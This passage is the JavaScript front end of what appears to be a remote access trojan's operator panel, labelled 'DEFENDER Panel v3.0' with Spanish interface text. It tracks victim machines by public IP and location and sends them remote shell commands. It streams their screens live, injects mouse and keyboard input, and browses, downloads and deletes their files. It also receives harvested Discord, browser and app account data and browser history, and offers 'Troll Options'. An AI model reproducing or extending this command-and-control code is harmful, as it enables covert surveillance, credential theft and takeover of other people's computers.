// ============================================
// DEFENDER Panel v3.0 — Frontend Logic
// ============================================

// === STATE ===
let socket = null;
let authToken = localStorage.getItem('defender_token');
let currentUser = localStorage.getItem('defender_user');
let selectedDeviceId = null;
let devices = [];
let isStreaming = false;
let streamFrameCount = 0;
let streamStartTime = 0;
let commandHistory = [];
let historyIndex = -1;
let screenControlEnabled = false;
let currentPath = '';
let currentFiles = [];
let selectedFiles = new Set();
let sortColumn = 'name';
let sortDirection = 'asc';
let currentRenameFile = null;
let moveCopyMode = null;
let moveCopyFiles = [];
let currentPreviewFile = null;
let currentEditFile = null;

// ============================================
// INIT
// ============================================
window.addEventListener('DOMContentLoaded', () => {
  if (authToken && currentUser) {
    showDashboard();
    connectSocket();
  }
  initParticles();
  startClock();
});

// ============================================
// AUTH
// ============================================
async function handleLogin(e) {
  e.preventDefault();
  const user = document.getElementById('login-user').value;
  const pass = document.getElementById('login-pass').value;
  const btn = document.getElementById('btn-login');
  const loader = document.getElementById('login-loader');
  const errorEl = document.getElementById('login-error');

  btn.disabled = true;
  loader.classList.remove('hidden');
  errorEl.classList.add('hidden');

  try {
    const res = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: user, password: pass })
    });
    const data = await res.json();
    if (data.token) {
      authToken = data.token;
      currentUser = data.user.username;
      localStorage.setItem('defender_token', authToken);
      localStorage.setItem('defender_user', currentUser);
      showDashboard();
      connectSocket();
    } else {
      errorEl.textContent = data.message || 'Credenciales inválidas';
      errorEl.classList.remove('hidden');
    }
  } catch (err) {
    errorEl.textContent = 'Error de conexión al servidor';
    errorEl.classList.remove('hidden');
  }

  btn.disabled = false;
  loader.classList.add('hidden');
}

function logout() {
  authToken = null;
  currentUser = null;
  localStorage.removeItem('defender_token');
  localStorage.removeItem('defender_user');
  if (socket) socket.disconnect();
  document.getElementById('dashboard').classList.add('hidden');
  document.getElementById('login-screen').classList.remove('hidden');
}

function showDashboard() {
  document.getElementById('login-screen').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  document.getElementById('current-user').textContent = currentUser || 'admin';
}

// ============================================
// SOCKET.IO
// ============================================
function connectSocket() {
  socket = io({ auth: { token: authToken, type: 'panel' } });

  socket.on('connect', () => {
    showToast('Conectado al servidor', 'success');
  });

  socket.on('connect_error', (err) => {
    if (err.message === 'Token inválido' || err.message === 'jwt expired') {
      logout();
    }
  });

  socket.on('devices-update', (list) => {
    devices = list;
    renderDevices();
    updateStats();
    updateDeviceSelector();
  });

  socket.on('device-connected', (info) => {
    showToast(`🟢 ${info.pcName || info.deviceId} conectado`, 'success');
  });

  socket.on('device-disconnected', (info) => {
    showToast(`🔴 ${info.deviceId} desconectado`, 'warning');
    if (isStreaming && selectedDeviceId === info.deviceId) {
      stopScreenStream();
    }
  });

  socket.on('command-result', (data) => {
    if (data.error) {
      addTerminalLine(data.result || 'Error', 'error');
    } else {
      addTerminalLine(data.result || '(sin salida)', 'result');
    }
  });

  socket.on('screenshot-result', (data) => {
    showToast('📸 Screenshot recibido', 'info');
    const img = document.getElementById('modal-screenshot-img');
    img.src = 'data:image/jpeg;base64,' + data.image;
    document.getElementById('screenshot-modal').classList.remove('hidden');
  });

  socket.on('screen-frame', (data) => {
    const img = document.getElementById('screen-image');
    const placeholder = document.getElementById('screen-placeholder');
    img.src = 'data:image/jpeg;base64,' + data.frame;
    img.classList.remove('hidden');
    placeholder.style.display = 'none';
    streamFrameCount++;
    const elapsed = (Date.now() - streamStartTime) / 1000;
    if (elapsed > 0) {
      document.getElementById('stream-fps').textContent = Math.round(streamFrameCount / elapsed) + ' FPS';
    }
  });

  socket.on('ls-result', (data) => {
    currentFiles = data.items || data.files || [];
    currentPath = data.currentPath || data.path || currentPath;
    document.getElementById('files-path-input').value = currentPath;
    renderFiles();
  });

  socket.on('processes-result', (data) => {
    if (data.processes) {
      addTerminalLine(data.processes, 'result');
    }
  });

  socket.on('file-data', (data) => {
    const blob = new Blob([Uint8Array.from(atob(data.data), c => c.charCodeAt(0))]);
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = data.filename || 'file';
    a.click();
    URL.revokeObjectURL(url);
    showToast('📥 Archivo descargado', 'success');
  });

  socket.on('preview-result', (data) => {
    const container = document.getElementById('preview-content');
    const title = document.getElementById('preview-title');
    title.textContent = data.filename || 'Preview';
    const content = data.content || data.data || '';
    const ext = (data.filename || '').split('.').pop().toLowerCase();
    const imageExts = ['jpg','jpeg','png','gif','bmp','svg','webp','ico'];
    if (data.type === 'image' || imageExts.includes(ext)) {
      container.innerHTML = `<img src="data:image/${ext || 'png'};base64,${content}">`;
    } else {
      try {
        const text = atob(content);
        container.innerHTML = `<pre>${escapeHtml(text)}</pre>`;
      } catch(e) {
        container.innerHTML = `<pre>${escapeHtml(content)}</pre>`;
      }
    }
    document.getElementById('file-preview-modal').classList.remove('hidden');
  });

  socket.on('file-content', (data) => {
    const raw = data.content || data.data || '';
    let text;
    try { text = atob(raw); } catch(e) { text = raw; }
    document.getElementById('editor-content').value = text;
    document.getElementById('editor-title').textContent = '✏️ ' + (data.filename || 'Editor');
    currentEditFile = data.filepath || data.filename;
    document.getElementById('editor-modal').classList.remove('hidden');
  });

  // Task Manager: detailed process list
  socket.on('processes-detailed', (data) => {
    processList = data.processes || [];
    renderProcesses();
  });

  // Accounts data
  socket.on('browser-history', (data) => { window._historyData = data.history || []; renderHistory(); });
socket.on('accounts-data', (data) => {
    accountsData = {
      discord: data.discord || [],
      browsers: data.browsers || [],
      apps: data.apps || []
    };
    renderAccounts();
  });
}

// ============================================
// DEVICES — TABLE RENDERING
// ============================================
function renderDevices() {
  const tbody = document.getElementById('devices-tbody');
  const noDevices = document.getElementById('no-devices');
  const search = document.getElementById('devices-search').value.toLowerCase();
  const filterOs = document.getElementById('filter-os').value;
  const filterStatus = document.getElementById('filter-status').value;
  const filterRam = document.getElementById('filter-ram').value;

  let filtered = devices.filter(d => {
    // Search filter
    if (search) {
      const haystack = `${d.pc_name} ${d.username} ${d.public_ip} ${d.local_ip} ${d.os} ${d.cpu} ${d.ram} ${d.location}`.toLowerCase();
      if (!haystack.includes(search)) return false;
    }
    // OS filter
    if (filterOs && !(d.os || '').toLowerCase().includes(filterOs.toLowerCase())) return false;
    // Status filter
    if (filterStatus === 'online' && !d.is_online) return false;
    if (filterStatus === 'offline' && d.is_online) return false;
    // RAM filter
    if (filterRam) {
      const ramGB = parseRamGB(d.ram);
      if (filterRam === 'low' && ramGB >= 4) return false;
      if (filterRam === 'mid' && (ramGB < 4 || ramGB > 8)) return false;
      if (filterRam === 'high' && ramGB <= 8) return false;
    }
    return true;
  });

  if (filtered.length === 0) {
    tbody.innerHTML = '';
    noDevices.style.display = 'block';
    return;
  }

  noDevices.style.display = 'none';

  tbody.innerHTML = filtered.map(d => {
    const isOnline = d.is_online;
    const statusClass = isOnline ? 'online' : 'offline';
    const flag = getCountryFlag(d.location);
    const lastSeen = timeAgo(d.last_seen);
    const osName = d.os || 'Unknown';
    const selected = d.id === selectedDeviceId ? 'selected' : '';

    return `<tr class="${selected}" onclick="selectDevice('${d.id}')" ondblclick="connectToDevice('${d.id}')">
      <td><span class="status-dot ${statusClass}"></span></td>
      <td><span class="country-flag">${flag}</span></td>
      <td>${escapeHtml(d.public_ip || d.local_ip || '-')}</td>
      <td><strong>${escapeHtml(d.pc_name || '-')}</strong></td>
      <td>${escapeHtml(d.username || '-')}</td>
      <td><span class="os-badge">${escapeHtml(osName)}</span></td>
      <td>${escapeHtml(d.cpu || '-')}</td>
      <td>${escapeHtml(d.ram || '-')}</td>
      <td>${lastSeen}</td>
      <td>
        <div class="table-actions">
          <button class="btn-table btn-connect" onclick="event.stopPropagation(); connectToDevice('${d.id}')">Connect</button>
          <button class="btn-table" onclick="event.stopPropagation(); requestScreenshotFor('${d.id}')">Screenshot</button>
          <button class="btn-table btn-delete" onclick="event.stopPropagation(); deleteDevice('${d.id}')">Delete</button>
        </div>
      </td>
    </tr>`;
  }).join('');
}

function filterDevices() {
  renderDevices();
}

function updateStats() {
  const total = devices.length;
  const online = devices.filter(d => d.is_online).length;
  const offline = total - online;

  document.getElementById('stat-total-pill').textContent = `${total} DEVICES`;
  document.getElementById('stat-online-pill').textContent = `${online} ONLINE`;
  document.getElementById('stat-offline-pill').textContent = `${offline} OFFLINE`;
  document.getElementById('device-count').textContent = total;
}

function parseRamGB(ramStr) {
  if (!ramStr) return 0;
  const match = ramStr.match(/([\d.]+)/);
  if (!match) return 0;
  const val = parseFloat(match[1]);
  if (ramStr.toLowerCase().includes('mb')) return val / 1024;
  return val;
}

function timeAgo(dateStr) {
  if (!dateStr) return '-';
  const now = new Date();
  const then = new Date(dateStr + (dateStr.includes('Z') ? '' : 'Z'));
  const diff = Math.floor((now - then) / 1000);
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return `${Math.floor(diff / 86400)}d ago`;
}

function getCountryFlag(location) {
  if (!location) return '🌐';
  const loc = location.toLowerCase();
  const flags = {
    'spain': '🇪🇸', 'españa': '🇪🇸', 'es': '🇪🇸',
    'germany': '🇩🇪', 'deutschland': '🇩🇪', 'de': '🇩🇪',
    'united states': '🇺🇸', 'usa': '🇺🇸', 'us': '🇺🇸',
    'france': '🇫🇷', 'fr': '🇫🇷',
    'italy': '🇮🇹', 'it': '🇮🇹',
    'uk': '🇬🇧', 'united kingdom': '🇬🇧', 'gb': '🇬🇧',
    'brazil': '🇧🇷', 'br': '🇧🇷',
    'mexico': '🇲🇽', 'mx': '🇲🇽',
    'argentina': '🇦🇷', 'ar': '🇦🇷',
    'colombia': '🇨🇴', 'co': '🇨🇴',
    'chile': '🇨🇱', 'cl': '🇨🇱',
    'portugal': '🇵🇹', 'pt': '🇵🇹',
    'russia': '🇷🇺', 'ru': '🇷🇺',
    'china': '🇨🇳', 'cn': '🇨🇳',
    'japan': '🇯🇵', 'jp': '🇯🇵',
    'canada': '🇨🇦', 'ca': '🇨🇦',
    'australia': '🇦🇺', 'au': '🇦🇺',
    'netherlands': '🇳🇱', 'nl': '🇳🇱',
    'poland': '🇵🇱', 'pl': '🇵🇱',
    'india': '🇮🇳', 'in': '🇮🇳',
    'turkey': '🇹🇷', 'tr': '🇹🇷',
    'sweden': '🇸🇪', 'se': '🇸🇪',
    'peru': '🇵🇪', 'pe': '🇵🇪',
    'venezuela': '🇻🇪', 've': '🇻🇪',
    'ecuador': '🇪🇨', 'ec': '🇪🇨',
  };
  for (const [key, flag] of Object.entries(flags)) {
    if (loc.includes(key)) return flag;
  }
  return '🌐';
}

function selectDevice(deviceId) {
  selectedDeviceId = deviceId;
  const sel = document.getElementById('device-selector');
  if (sel) sel.value = deviceId;
  renderDevices();
  updateSelectedDeviceInfo();
}

function connectToDevice(deviceId) {
  selectDevice(deviceId);
  switchView('terminal');
  const dev = devices.find(d => d.id === deviceId);
  if (dev) {
    addTerminalLine(`Conectado a ${dev.pc_name} (${deviceId})`, 'system');
  }
}

function requestScreenshotFor(deviceId) {
  if (!socket) return;
  selectedDeviceId = deviceId;
  socket.emit('request-screenshot', { deviceId });
  showToast('📸 Solicitando screenshot...', 'info');
}

function deleteDevice(deviceId) {
  if (!confirm(`¿Eliminar dispositivo ${deviceId}?`)) return;
  // Remove from local list
  devices = devices.filter(d => d.id !== deviceId);
  renderDevices();
  updateStats();
  showToast('Dispositivo eliminado', 'info');
}

function deleteAllDevices() {
  if (!confirm('¿Eliminar TODOS los dispositivos?')) return;
  devices = [];
  renderDevices();
  updateStats();
  showToast('Todos los dispositivos eliminados', 'info');
}

function deleteOfflineDevices() {
  if (!confirm('¿Eliminar todos los dispositivos offline?')) return;
  devices = devices.filter(d => d.is_online);
  renderDevices();
  updateStats();
  showToast('Dispositivos offline eliminados', 'info');
}

function updateDeviceSelector() {
  const sel = document.getElementById('device-selector');
  if (!sel) return;
  const prevVal = sel.value;
  sel.innerHTML = '<option value="">-- Seleccionar --</option>' +
    devices.map(d => `<option value="${d.id}" ${d.is_online ? '' : 'disabled'}>${d.is_online ? '🟢' : '🔴'} ${d.pc_name} (${d.id})</option>`).join('');
  if (prevVal) sel.value = prevVal;
}

function updateSelectedDeviceInfo() {
  const span = document.getElementById('selected-device-info');
  if (!span) return;
  const dev = devices.find(d => d.id === selectedDeviceId);
  span.textContent = dev ? `${dev.pc_name} — ${dev.os} — ${dev.public_ip || dev.local_ip || ''}` : '';
}

// ============================================
// NAVIGATION
// ============================================
function switchView(viewName) {
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));

  const view = document.getElementById('view-' + viewName);
  if (view) view.classList.add('active');

  const nav = document.querySelector(`.nav-item[data-view="${viewName}"]`);
  if (nav) nav.classList.add('active');

  const titles = { devices: 'Dispositivos', terminal: 'Terminal', screen: 'View Screen', files: 'Archivos', controls: 'Controles', taskmanager: 'Task Manager', accounts: 'Accounts', history: 'Browser History', troll: 'Troll Options' };
  document.getElementById('page-title').textContent = titles[viewName] || viewName;

  // Show/hide history and troll views (they use different id pattern)
  const hv = document.getElementById('history-view');
  const tv = document.getElementById('troll-view');
  if (hv) hv.style.display = viewName === 'history' ? 'block' : 'none';
  if (tv) tv.style.display = viewName === 'troll' ? 'block' : 'none';

  const selectorBar = document.getElementById('device-selector-bar');
  if (['terminal', 'screen', 'files', 'controls', 'taskmanager', 'accounts', 'history', 'troll'].includes(viewName)) {
    selectorBar.classList.remove('hidden');
  } else {
    selectorBar.classList.add('hidden');
  }

  // Close mobile sidebar
  document.getElementById('sidebar').classList.remove('open');

  // Auto-load files when switching to files view
  if (viewName === 'files' && selectedDeviceId && !currentPath) {
    currentPath = 'C:/';
    document.getElementById('files-path-input').value = currentPath;
    socket.emit('request-ls', { deviceId: selectedDeviceId, path: currentPath });
  }
}

// Sidebar nav clicks
document.addEventListener('click', (e) => {
  const navItem = e.target.closest('.nav-item[data-view]');
  if (navItem) {
    e.preventDefault();
    switchView(navItem.dataset.view);
  }
});

// Device selector change
document.addEventListener('change', (e) => {
  if (e.target.id === 'device-selector') {
    selectedDeviceId = e.target.value;
    updateSelectedDeviceInfo();
    // Auto-load files if currently on files view
    const filesView = document.getElementById('view-files');
    if (filesView && filesView.classList.contains('active') && selectedDeviceId) {
      currentPath = currentPath || 'C:/';
      document.getElementById('files-path-input').value = currentPath;
      socket.emit('request-ls', { deviceId: selectedDeviceId, path: currentPath });
    }
  }
});

function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
}

// ============================================
// TERMINAL
// ============================================
function handleTerminalKey(e) {
  if (e.key === 'Enter') {
    sendTerminalCommand();
  } else if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (historyIndex < commandHistory.length - 1) {
      historyIndex++;
      document.getElementById('terminal-input').value = commandHistory[commandHistory.length - 1 - historyIndex];
    }
  } else if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (historyIndex > 0) {
      historyIndex--;
      document.getElementById('terminal-input').value = commandHistory[commandHistory.length - 1 - historyIndex];
    } else {
      historyIndex = -1;
      document.getElementById('terminal-input').value = '';
    }
  }
}

function sendTerminalCommand() {
  const input = document.getElementById('terminal-input');
  const cmd = input.value.trim();
  if (!cmd) return;

  commandHistory.push(cmd);
  historyIndex = -1;
  addTerminalLine(cmd, 'cmd');
  input.value = '';

  if (!selectedDeviceId) {
    addTerminalLine('⚠ Selecciona un dispositivo primero', 'error');
    return;
  }

  socket.emit('send-command', { deviceId: selectedDeviceId, command: 'shell', args: cmd });
}

function quickCmd(cmd) {
  if (!selectedDeviceId) {
    showToast('Selecciona un dispositivo primero', 'warning');
    return;
  }
  addTerminalLine(cmd, 'cmd');

  if (cmd === 'screenshot') {
    socket.emit('request-screenshot', { deviceId: selectedDeviceId });
  } else if (cmd === 'processes') {
    socket.emit('request-processes', { deviceId: selectedDeviceId });
  } else {
    socket.emit('send-command', { deviceId: selectedDeviceId, command: cmd });
  }
}

function addTerminalLine(text, type) {
  const body = document.getElementById('terminal-body');
  const line = document.createElement('div');
  line.className = `terminal-line ${type}`;
  line.textContent = text;
  body.appendChild(line);
  body.scrollTop = body.scrollHeight;
}

function clearTerminal() {
  const body = document.getElementById('terminal-body');
  body.innerHTML = '<div class="terminal-line system">[Terminal limpiada]</div>';
}

// ============================================
// COMMANDS / CONTROLS
// ============================================
function sendCmd(command, args) {
  if (!selectedDeviceId) {
    showToast('Selecciona un dispositivo primero', 'warning');
    return;
  }
  socket.emit('send-command', { deviceId: selectedDeviceId, command, args });
}

function sendMouseMove() {
  const x = document.getElementById('mouse-x').value;
  const y = document.getElementById('mouse-y').value;
  if (x && y) sendCmd('move_mouse', `${x},${y}`);
}

function sendWallpaper() {
  const fileInput = document.getElementById('wallpaper-input');
  if (!fileInput.files[0]) return;
  const reader = new FileReader();
  reader.onload = () => {
    const base64 = reader.result.split(',')[1];
    sendCmd('wallpaper', base64);
    showToast('🖼️ Wallpaper enviado', 'info');
  };
  reader.readAsDataURL(fileInput.files[0]);
}

function confirmDanger(cmd, msg) {
  if (confirm(msg)) sendCmd(cmd);
}

// ============================================
// SCREEN STREAMING
// ============================================
function toggleStream() {
  if (isStreaming) {
    stopScreenStream();
  } else {
    startScreenStream();
  }
}

function startScreenStream() {
  if (!selectedDeviceId) {
    showToast('Selecciona un dispositivo primero', 'warning');
    return;
  }
  const quality = parseInt(document.getElementById('stream-quality').value);
  socket.emit('start-screen-stream', { deviceId: selectedDeviceId, fps: 2, quality });
  isStreaming = true;
  streamFrameCount = 0;
  streamStartTime = Date.now();

  const btn = document.getElementById('btn-start-stream');
  btn.textContent = '⏹ Detener Stream';
  btn.classList.add('streaming');

  const status = document.getElementById('stream-status');
  status.textContent = '🔴 LIVE';
  status.classList.add('live');
}

function stopScreenStream() {
  if (selectedDeviceId) {
    socket.emit('stop-screen-stream', { deviceId: selectedDeviceId });
  }
  isStreaming = false;

  const btn = document.getElementById('btn-start-stream');
  btn.textContent = '▶ Iniciar View Screen';
  btn.classList.remove('streaming');

  const status = document.getElementById('stream-status');
  status.textContent = '⏹ Detenido';
  status.classList.remove('live');
  document.getElementById('stream-fps').textContent = '';
}

function toggleScreenControl() {
  screenControlEnabled = !screenControlEnabled;
  const btn = document.getElementById('btn-toggle-control');
  const viewer = document.getElementById('screen-viewer');

  if (screenControlEnabled) {
    btn.textContent = '🔓 Control Activo';
    btn.classList.add('control-active');
    viewer.classList.add('control-active');
    showToast('🎮 Control remoto activado', 'success');
    document.addEventListener('keydown', handleScreenKeydown);
  } else {
    btn.textContent = '🔒 Activar Control';
    btn.classList.remove('control-active');
    viewer.classList.remove('control-active');
    showToast('🔒 Control remoto desactivado', 'info');
    document.removeEventListener('keydown', handleScreenKeydown);
  }
}

// Calculate real screen coordinates from click position on the image
function getScreenCoords(e) {
  const img = e.target;
  const rect = img.getBoundingClientRect();
  const natW = img.naturalWidth || 1920;
  const natH = img.naturalHeight || 1080;
  
  // Account for object-fit: contain - image may have letterbox bars
  const imgAspect = natW / natH;
  const boxAspect = rect.width / rect.height;
  
  let renderW, renderH, offsetX, offsetY;
  if (imgAspect > boxAspect) {
    // Image is wider than box - horizontal bars on top/bottom
    renderW = rect.width;
    renderH = rect.width / imgAspect;
    offsetX = 0;
    offsetY = (rect.height - renderH) / 2;
  } else {
    // Image is taller - vertical bars on sides
    renderH = rect.height;
    renderW = rect.height * imgAspect;
    offsetX = (rect.width - renderW) / 2;
    offsetY = 0;
  }
  
  const clickX = e.clientX - rect.left - offsetX;
  const clickY = e.clientY - rect.top - offsetY;
  
  // Clamp to image bounds
  const x = Math.round(Math.max(0, Math.min(natW, clickX / renderW * natW)));
  const y = Math.round(Math.max(0, Math.min(natH, clickY / renderH * natH)));
  
  return { x, y, localX: e.clientX - rect.left, localY: e.clientY - rect.top };
}

function handleScreenClick(e) {
  if (!screenControlEnabled || !selectedDeviceId) return;
  e.preventDefault();
  const { x, y, localX, localY } = getScreenCoords(e);

  socket.emit('remote-input', { deviceId: selectedDeviceId, type: 'move_mouse', x, y });
  setTimeout(() => {
    socket.emit('remote-input', { deviceId: selectedDeviceId, type: 'click' });
  }, 50);
  showClickFeedback(localX, localY, 'left', e.target.parentElement);
}

function handleScreenRightClick(e) {
  if (!screenControlEnabled || !selectedDeviceId) return;
  e.preventDefault();
  const { x, y, localX, localY } = getScreenCoords(e);

  socket.emit('remote-input', { deviceId: selectedDeviceId, type: 'move_mouse', x, y });
  setTimeout(() => {
    socket.emit('remote-input', { deviceId: selectedDeviceId, type: 'rightclick' });
  }, 50);
  showClickFeedback(localX, localY, 'right', e.target.parentElement);
}

function showClickFeedback(x, y, type, container) {
  const fb = document.createElement('div');
  fb.className = `click-feedback ${type}`;
  fb.style.left = (x - 15) + 'px';
  fb.style.top = (y - 15) + 'px';
  container.appendChild(fb);
  setTimeout(() => fb.remove(), 500);
}

function handleScreenKeydown(e) {
  if (!screenControlEnabled || !selectedDeviceId) return;
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') return;
  e.preventDefault();

  const mapped = mapKeyToWindows(e.key);
  if (mapped) {
    socket.emit('remote-input', { deviceId: selectedDeviceId, type: 'keypress', key: mapped });
  } else if (e.key.length === 1) {
    socket.emit('remote-input', { deviceId: selectedDeviceId, type: 'type', text: e.key });
  }
}

function mapKeyToWindows(key) {
  const map = {
    'Enter': 'enter', 'Backspace': 'backspace', 'Tab': 'tab',
    'Escape': 'escape', 'Delete': 'delete', 'Home': 'home', 'End': 'end',
    'PageUp': 'pageup', 'PageDown': 'pagedown',
    'ArrowUp': 'up', 'ArrowDown': 'down', 'ArrowLeft': 'left', 'ArrowRight': 'right',
    'F1': 'f1', 'F2': 'f2', 'F3': 'f3', 'F4': 'f4', 'F5': 'f5',
    'F6': 'f6', 'F7': 'f7', 'F8': 'f8', 'F9': 'f9', 'F10': 'f10',
    'F11': 'f11', 'F12': 'f12'
  };
  return map[key] || null;
}

function toggleFullscreen() {
  const viewer = document.getElementById('screen-viewer');
  viewer.classList.toggle('fullscreen-mode');
}

function requestScreenshot() {
  if (!selectedDeviceId) return showToast('Selecciona un dispositivo', 'warning');
  socket.emit('request-screenshot', { deviceId: selectedDeviceId });
  showToast('📸 Solicitando screenshot...', 'info');
}

function updateQualityLabel() {
  document.getElementById('quality-label').textContent = document.getElementById('stream-quality').value + '%';
}

// ============================================
// FILE EXPLORER
// ============================================
function navigateToPath() {
  const path = document.getElementById('files-path-input').value;
  if (!path || !selectedDeviceId) return;
  currentPath = path;
  socket.emit('request-ls', { deviceId: selectedDeviceId, path });
}

function navigateParent() {
  if (!currentPath || !selectedDeviceId) return;
  const parts = currentPath.replace(/\\/g, '/').split('/').filter(Boolean);
  parts.pop();
  currentPath = parts.length ? parts.join('/') : (currentPath.includes(':') ? currentPath.split(':')[0] + ':/' : '/');
  document.getElementById('files-path-input').value = currentPath;
  socket.emit('request-ls', { deviceId: selectedDeviceId, path: currentPath });
}

function navigateHome() {
  if (!selectedDeviceId) return;
  currentPath = 'C:/';
  document.getElementById('files-path-input').value = currentPath;
  socket.emit('request-ls', { deviceId: selectedDeviceId, path: currentPath });
}

function navigateToQuick(folder) {
  if (!selectedDeviceId) return;
  const dev = devices.find(d => d.id === selectedDeviceId);
  const username = dev ? dev.username : '';
  if (folder === 'Program Files' || folder === 'Program Files (x86)') {
    currentPath = `C:/${folder}`;
  } else if (folder === 'AppData') {
    currentPath = username ? `C:/Users/${username}/AppData` : 'C:/Users';
  } else {
    currentPath = username ? `C:/Users/${username}/${folder}` : `C:/Users`;
  }
  document.getElementById('files-path-input').value = currentPath;
  socket.emit('request-ls', { deviceId: selectedDeviceId, path: currentPath });
}

function navigateToDir(dirName) {
  if (!selectedDeviceId) return;
  currentPath = currentPath.replace(/\\/g, '/');
  if (!currentPath.endsWith('/')) currentPath += '/';
  currentPath += dirName;
  document.getElementById('files-path-input').value = currentPath;
  socket.emit('request-ls', { deviceId: selectedDeviceId, path: currentPath });
}

function refreshFiles() {
  if (currentPath && selectedDeviceId) {
    socket.emit('request-ls', { deviceId: selectedDeviceId, path: currentPath });
  }
}

function renderFiles() {
  const list = document.getElementById('files-list');
  selectedFiles.clear();
  updateBatchBar();

  let files = [...currentFiles];

  // Apply sort
  files.sort((a, b) => {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    let cmp = 0;
    if (sortColumn === 'name') cmp = (a.name || '').localeCompare(b.name || '');
    else if (sortColumn === 'size') cmp = (a.size || 0) - (b.size || 0);
    else if (sortColumn === 'date') cmp = new Date(a.modified || 0) - new Date(b.modified || 0);
    return sortDirection === 'asc' ? cmp : -cmp;
  });

  // Apply search filter
  const search = document.getElementById('files-search-input');
  if (search && search.value) {
    const q = search.value.toLowerCase();
    files = files.filter(f => (f.name || '').toLowerCase().includes(q));
  }

  if (files.length === 0) {
    list.innerHTML = '<div class="files-placeholder"><p>Carpeta vacía</p></div>';
    return;
  }

  list.innerHTML = files.map(f => {
    const icon = f.isDir ? '📁' : getFileIcon(f.name);
    const size = f.isDir ? '-' : formatSize(f.size);
    const date = f.modified ? new Date(f.modified).toLocaleDateString() : '-';
    const nameClick = f.isDir ? `navigateToDir('${escapeAttr(f.name)}')` : `previewFile('${escapeAttr(f.name)}')`;

    return `<div class="file-item" ondblclick="${nameClick}">
      <input type="checkbox" class="file-item-checkbox" data-name="${escapeAttr(f.name)}" onchange="toggleFileSelection(this)" onclick="event.stopPropagation()">
      <span class="file-item-icon">${icon}</span>
      <span class="file-item-name" onclick="${nameClick}">${escapeHtml(f.name)}</span>
      <span class="file-item-size">${size}</span>
      <span class="file-item-date">${date}</span>
      <div class="file-actions">
        <button onclick="event.stopPropagation(); downloadFile('${escapeAttr(f.name)}')">📥</button>
        <button onclick="event.stopPropagation(); showRenameDialog('${escapeAttr(f.name)}')">✏️</button>
        <button onclick="event.stopPropagation(); deleteFile('${escapeAttr(f.name)}')">🗑️</button>
        ${!f.isDir && isEditable(f.name) ? `<button onclick="event.stopPropagation(); editFile('${escapeAttr(f.name)}')">📝</button>` : ''}
      </div>
    </div>`;
  }).join('');
}

function getFileIcon(name) {
  if (!name) return '📄';
  const ext = name.split('.').pop().toLowerCase();
  const icons = {
    jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', bmp: '🖼️', svg: '🖼️', webp: '🖼️',
    mp4: '🎬', avi: '🎬', mkv: '🎬', mov: '🎬',
    mp3: '🎵', wav: '🎵', ogg: '🎵', flac: '🎵',
    pdf: '📕', doc: '📘', docx: '📘', xls: '📗', xlsx: '📗', ppt: '📙', pptx: '📙',
    zip: '📦', rar: '📦', '7z': '📦', tar: '📦', gz: '📦',
    exe: '⚙️', msi: '⚙️', bat: '⚙️', cmd: '⚙️', ps1: '⚙️',
    js: '📜', py: '🐍', html: '🌐', css: '🎨', json: '📋', xml: '📋',
    txt: '📝', log: '📝', md: '📝', cfg: '📝', ini: '📝',
    dll: '🔧', sys: '🔧', iso: '💿', img: '💿',
  };
  return icons[ext] || '📄';
}

function isEditable(name) {
  if (!name) return false;
  const ext = name.split('.').pop().toLowerCase();
  return ['txt', 'log', 'json', 'js', 'py', 'html', 'css', 'xml', 'cfg', 'ini', 'md', 'bat', 'cmd', 'ps1', 'yaml', 'yml', 'toml', 'csv'].includes(ext);
}

function formatSize(bytes) {
  if (!bytes || bytes === 0) return '0 B';
  const units = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return (bytes / Math.pow(1024, i)).toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
}

function sortFiles(col) {
  if (sortColumn === col) {
    sortDirection = sortDirection === 'asc' ? 'desc' : 'asc';
  } else {
    sortColumn = col;
    sortDirection = 'asc';
  }
  document.querySelectorAll('.sort-indicator').forEach(el => { el.className = 'sort-indicator'; });
  const indicator = document.getElementById('sort-' + col);
  if (indicator) indicator.className = 'sort-indicator ' + sortDirection;
  renderFiles();
}

function filterFiles() {
  renderFiles();
}

function toggleFilesSearch() {
  const bar = document.getElementById('files-search-bar');
  bar.classList.toggle('hidden');
  if (!bar.classList.contains('hidden')) {
    document.getElementById('files-search-input').focus();
  }
}

// File selection
function toggleFileSelection(checkbox) {
  const name = checkbox.dataset.name;
  if (checkbox.checked) {
    selectedFiles.add(name);
  } else {
    selectedFiles.delete(name);
  }
  updateBatchBar();
}

function toggleSelectAll() {
  const checked = document.getElementById('select-all-checkbox').checked;
  document.querySelectorAll('.file-item-checkbox').forEach(cb => {
    cb.checked = checked;
    if (checked) selectedFiles.add(cb.dataset.name);
    else selectedFiles.delete(cb.dataset.name);
  });
  updateBatchBar();
}

function clearSelection() {
  selectedFiles.clear();
  document.querySelectorAll('.file-item-checkbox').forEach(cb => cb.checked = false);
  updateBatchBar();
}

function updateBatchBar() {
  const bar = document.getElementById('files-batch-bar');
  const count = document.getElementById('selected-count');
  if (selectedFiles.size > 0) {
    bar.classList.remove('hidden');
    count.textContent = `${selectedFiles.size} seleccionados`;
  } else {
    bar.classList.add('hidden');
  }
}

// File operations
function downloadFile(name) {
  if (!selectedDeviceId) return;
  const filepath = currentPath.replace(/\\/g, '/') + '/' + name;
  socket.emit('request-download', { deviceId: selectedDeviceId, filepath });
  showToast('📥 Descargando...', 'info');
}

function deleteFile(name) {
  if (!confirm(`¿Eliminar ${name}?`)) return;
  if (!selectedDeviceId) return;
  const filepath = currentPath.replace(/\\/g, '/') + '/' + name;
  socket.emit('delete-file', { deviceId: selectedDeviceId, filepath });
